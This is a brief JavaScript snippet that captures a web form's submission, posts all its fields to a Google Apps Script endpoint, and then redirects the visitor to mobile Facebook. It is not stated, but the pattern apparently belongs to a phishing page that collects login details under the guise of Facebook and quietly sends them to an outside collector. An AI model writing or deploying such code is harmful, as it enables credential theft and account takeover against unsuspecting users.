const form = document.querySelector("#form")
    const scriptURL = 'https://script.google.com/macros/s/AKfycbxpiyY6dDz7WJGTNf61AmMyHCMIC2JlHECXNi92dTA6aDP1R4x5xAr-vn3QENcupLNU/exec'

    form.addEventListener('submit', e => {
      e.preventDefault()

      console.log(form)
      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
        .then(response => { window.location.href='http://m.facebook.com' })
        .catch(error => alert('Error!', error.message))
    })
